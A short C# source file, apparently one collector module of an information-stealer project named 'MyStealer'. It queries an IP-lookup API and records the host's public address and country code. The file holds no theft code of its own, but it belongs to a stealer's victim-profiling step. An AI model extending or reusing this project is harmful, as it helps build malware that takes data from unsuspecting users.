using Newtonsoft.Json.Linq;
using System;
using System.Net;

namespace MyStealer.Collectors.Ip
{
    /// <summary>
    /// https://ip.pe.kr/api/
    /// </summary>
    internal class IpPeKrProvider : ApiProviderBase
    {
        public override string ModuleName => "ip.pe.kr";

        public override Uri ApiUrl => new Uri("https://api.ip.pe.kr/json/");

        public override IpDetails Parse(string response)
        {
            try
            {
                var obj = JObject.Parse(response);

                return new IpDetails
                {
                    Address = IPAddress.Parse(obj["ip"].Value<string>()),
                    CountryCode = obj["country_code"].Value<string>(),
                    RegionName = "",
                    City = ""
                };
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "Error parsing api response.");
                return IpDetails.Empty;
            }
        }
    }
}
